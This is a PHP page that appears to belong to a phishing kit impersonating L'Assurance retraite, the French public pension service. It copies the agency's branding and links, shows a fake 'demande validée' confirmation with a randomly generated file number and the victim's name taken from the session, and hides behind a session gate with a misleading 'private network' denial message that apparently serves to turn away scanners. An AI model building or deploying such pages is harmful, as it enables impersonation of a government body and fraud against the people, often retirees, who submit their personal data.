<?php
session_start();

if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
    die("THE REQUEST WAS DENIED: MAKE SURE YOU ARE NOT CONNECTED TO A PRIVATE NETWORK.");
}

$nom = $_SESSION['nom'] ?? 'Non spécifié';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Confirmation - L'Assurance retraite</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Open Sans', sans-serif;
        }

        body {
            background: #F5F5F5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            background: white;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }

        .header-top {
            background: #003d7a;
            padding: 8px 0;
        }

        .header-main {
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1200px;
            margin: 0 auto;
        }

        .logo {
            height: 60px;
        }

        .nav-icons {
            display: flex;
            gap: 20px;
            align-items: center;
            justify-content: center;
            flex: 1;
            margin-left: 40px;
        }

        .nav-icon {
            display: flex;
            flex-direction: row;
            align-items: center;
            text-decoration: none;
            color: #003d7a;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.3s;
            padding: 8px 12px;
            border-radius: 8px;
            gap: 8px;
        }

        .nav-icon:hover {
            background: #E6F2FF;
            color: #FF5E00;
        }

        .nav-icon img {
            width: 20px;
            height: 20px;
        }

        .hamburger {
            display: none;
            flex-direction: column;
            cursor: pointer;
            gap: 4px;
            z-index: 1001;
        }

        .hamburger span {
            width: 25px;
            height: 3px;
            background: #003d7a;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .hamburger.active span:nth-child(1) {
            transform: rotate(45deg) translate(6px, 6px);
        }

        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }

        .hamburger.active span:nth-child(3) {
            transform: rotate(-45deg) translate(6px, -6px);
        }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .confirmation-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            padding: 48px 40px;
            max-width: 600px;
            width: 100%;
            text-align: center;
        }

        .success-icon {
            width: 80px;
            height: 80px;
            background: #28a745;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            animation: scaleIn 0.5s ease-out;
        }

        @keyframes scaleIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .success-icon svg {
            width: 40px;
            height: 40px;
            stroke: white;
            stroke-width: 3;
        }

        h1 {
            color: #003d7a;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .description {
            color: #666;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 32px;
        }

        .info-card {
            background: #F8F9FA;
            border-radius: 8px;
            padding: 24px;
            text-align: left;
            margin-bottom: 24px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #E0E0E0;
        }

        .info-row:last-child {
            border-bottom: none;
        }

        .info-label {
            color: #666;
            font-size: 14px;
        }

        .info-value {
            color: #003d7a;
            font-weight: 600;
            font-size: 14px;
        }

        .btn-container {
            display: flex;
            gap: 16px;
            margin-top: 32px;
        }

        .btn {
            flex: 1;
            padding: 14px 32px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background: #003d7a;
            color: white;
            border: none;
        }

        .btn-primary:hover {
            background: #FF5E00;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 94, 0, 0.3);
        }

        .btn-secondary {
            background: white;
            color: #003d7a;
            border: 2px solid #003d7a;
        }

        .btn-secondary:hover {
            background: #E6F2FF;
        }

        .notice {
            background: #E6F2FF;
            border-radius: 8px;
            padding: 16px;
            font-size: 13px;
            color: #003d7a;
            margin-top: 24px;
            text-align: left;
        }

        footer {
            background: #003d7a;
            color: white;
            padding: 50px 24px 30px;
            margin-top: 80px;
        }

        

        /* Footer Styles */
        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 60px;
            margin-bottom: 40px;
        }

        .footer-logos {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 40px;
            justify-content: center;
        }

        .footer-logos img {
            height: 60px;
        }

        .footer-section h3 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            color: white;
        }

        .footer-section ul {
            list-style: none;
            padding: 0;
        }

        .footer-section ul li {
            margin-bottom: 12px;
        }

        .footer-section ul li a {
            color: white;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .footer-section ul li a:hover {
            color: #FF5E00;
        }

        .social-links {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-link {
            display: flex;
            align-items: center;
            gap: 12px;
            color: white;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .social-link:hover {
            color: #FF5E00;
        }

        .social-link svg,
        .social-link img {
            width: 24px;
            height: 24px;
        }

        .social-link img {
            background: white;
            border-radius: 50%;
            padding: 2px;
        }

        .newsletter-text {
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .newsletter-btn {
            background: white;
            color: #003d7a;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .newsletter-btn:hover {
            background: #FF5E00;
            color: white;
        }

        .footer-bottom {
            text-align: center;
            padding-top: 30px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 14px;
        }

        @media screen and (max-width: 768px) {
            .header-main {
                position: relative;
            }

            .nav-icons {
                position: fixed;
                top: 0;
                right: -100%;
                width: 280px;
                height: 100vh;
                background: white;
                flex-direction: column;
                box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
                padding: 20px 20px 20px;
                margin-left: 0;
                gap: 0;
                z-index: 1000;
                overflow-y: auto;
            }

            .nav-icons.active {
                right: 0;
            }

            .nav-icon {
                width: 100%;
                padding: 16px;
                border-radius: 0;
                border-bottom: 1px solid #E0E0E0;
                justify-content: flex-start;
            }

            .nav-icon span {
                display: inline;
            }

            .hamburger {
                display: flex;
            }

            .logo {
                height: 45px;
            }

            .confirmation-container {
                padding: 32px 24px;
            }

            .btn-container {
                flex-direction: column;
            }

            .footer-content {
                grid-template-columns: 1fr;
                gap: 40px;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="header-top"></div>
        <div class="header-main">
            <div class="logo-container">
                <img src="https://www.lassuranceretraite.fr/portail-info/files/live/sites/pub/files/newlogo.png" alt="L'Assurance retraite" class="logo">
            </div>
            <nav class="nav-icons" id="navMenu">
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/autre/questions-frequentes.html" class="nav-icon">
                    <img src="../assets/icons/FAQ.png" alt="FAQ">
                    <span>Questions fréquentes</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/contacts.html" class="nav-icon">
                    <img src="../assets/icons/contact.png" alt="Contact">
                    <span>Nous contacter</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html" class="nav-icon">
                    <img src="../assets/icons/logo AR.png" alt="Nous connaître">
                    <span>Nous connaître</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/entreprise.html" class="nav-icon">
                    <img src="../assets/icons/entreprise.png" alt="Entreprise">
                    <span>Entreprise</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/annexe/sourd-malentendant-contact.html" class="nav-icon">
                    <img src="../assets/icons/malentendant.png" alt="Sourd">
                    <span>Sourd - Malentendant</span>
                </a>
            </nav>
            <div class="hamburger" onclick="toggleMenu()">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
    </header>

    <main>
        <div class="confirmation-container">
            <div class="success-icon">
                <svg viewBox="0 0 24 24" fill="none">
                    <path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>

            <h1>Demande validée !</h1>
            <p class="description">
                Merci <?= htmlspecialchars($nom) ?>, votre demande a été enregistrée avec succès. 
                Vous recevrez une confirmation par email dans les prochaines minutes.
            </p>

            <div class="info-card">
                <div class="info-row">
                    <span class="info-label">Numéro de dossier</span>
                    <span class="info-value">#AR-<?= date('Ymd') ?>-<?= rand(1000, 9999) ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">Date de soumission</span>
                    <span class="info-value"><?= date('d/m/Y à H:i') ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">Statut</span>
                    <span class="info-value" style="color: #28a745;">✓ Validée</span>
                </div>
            </div>

            <div class="btn-container">
                <a href="https://www.lassuranceretraite.fr/" class="btn btn-primary">
                    Retour à l'accueil →
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/home/espace-personnel.html" class="btn btn-secondary">
                    Mon espace
                </a>
            </div>

            <div class="notice">
                📧 <strong>Important :</strong> Un email de confirmation vous a été envoyé. 
                Si vous ne le recevez pas dans les prochaines minutes, vérifiez votre dossier de courrier indésirable.
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-logos">
            <img src="../icones_PDP/logo_ss.svg" alt="La sécurité sociale">
            <img src="../icones_PDP/logobl.svg" alt="L'assurance retraite">
        </div>
        
        <div class="footer-content">
            <div class="footer-section">
                <h3>L'Assurance retraite</h3>
                <ul>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html">Nous connaître</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/home/nous-rejoindre.html">Nous rejoindre</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/espace-presse.html">Espace presse</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/nos-publications.html">Nos publications de référence</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/sites-internet-utiles.html">Sites internet utiles</a></li>
                </ul>
            </div>

            <div class="footer-section">
                <h3>Retrouvez-nous sur</h3>
                <div class="social-links">
                    <a href="https://www.youtube.com/@lassuranceretraite" class="social-link" target="_blank">
                        <img src="../icones_PDP/youtube.svg" alt="Youtube">
                        <span>Youtube</span>
                    </a>
                    <a href="https://twitter.com/assurretraite" class="social-link" target="_blank">
                        <img src="../icones_PDP/X.svg" alt="Twitter">
                        <span>Twitter</span>
                    </a>
                    <a href="https://www.linkedin.com/company/l-assurance-retraite/" class="social-link" target="_blank">
                        <img src="../icones_PDP/linkedin.svg" alt="LinkedIn">
                        <span>LinkedIn</span>
                    </a>
                </div>
            </div>

            <div class="footer-section">
                <h3>Notre newsletter</h3>
                <p class="newsletter-text">Inscrivez-vous gratuitement et recevez chaque trimestre, toutes les informations utiles et personnalisées pour préparer et gérer votre retraite.</p>
                <button class="newsletter-btn">Je m'inscris</button>
            </div>
        </div>

        <div class="footer-bottom">
            © <?= date('Y') ?> L'Assurance retraite - Tous droits réservés
        </div>
    </footer>

    <script>
        // Toggle mobile menu
        function toggleMenu() {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            menu.classList.toggle('active');
            hamburger.classList.toggle('active');
        }

        // Close menu when clicking outside
        document.addEventListener('click', function(event) {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            const isClickInsideMenu = menu.contains(event.target);
            const isClickOnHamburger = hamburger.contains(event.target);
            
            if (!isClickInsideMenu && !isClickOnHamburger && menu.classList.contains('active')) {
                menu.classList.remove('active');
                hamburger.classList.remove('active');
            }
        });
    </script>
</body>
</html>
